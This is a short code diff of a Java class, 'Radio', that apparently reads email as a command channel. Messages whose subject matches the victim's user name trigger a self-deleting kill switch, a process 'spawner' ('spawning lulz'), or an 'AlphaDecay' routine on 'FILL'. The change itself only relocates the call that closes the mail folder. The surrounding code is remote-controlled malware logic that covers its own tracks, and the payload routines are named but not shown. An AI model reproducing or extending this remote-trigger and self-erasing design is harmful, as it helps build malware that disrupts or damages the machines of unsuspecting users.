@@ -502,7 +502,6 @@ public class Radio
 			         {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Kill Command Received");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
-			        	 emailFolder.close(true);
 			        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 			 			 cf.deleteOnExit();
 			 			 System.exit(0);
@@ -511,7 +510,6 @@ public class Radio
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("WRECK")) {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Started spawning lulz :3");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
-			        	 emailFolder.close(true);
 			        	 spawner.start();
 			         }
 			         
@@ -519,14 +517,13 @@ public class Radio
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("FILL")) {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] WTF BOOOOOOOOOOOOOOOOOOOOOOM!");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
-			        	 emailFolder.close(true);
 			        	 AlphaDecay.start();
 			         }
 		      	  }
 		      }
 
 		      //close the store and folder objects
-		      emailFolder.close(false);
+		      emailFolder.close(true);
 		      store.close();
 		      return 0;
 		      } catch (NoSuchProviderException e) {
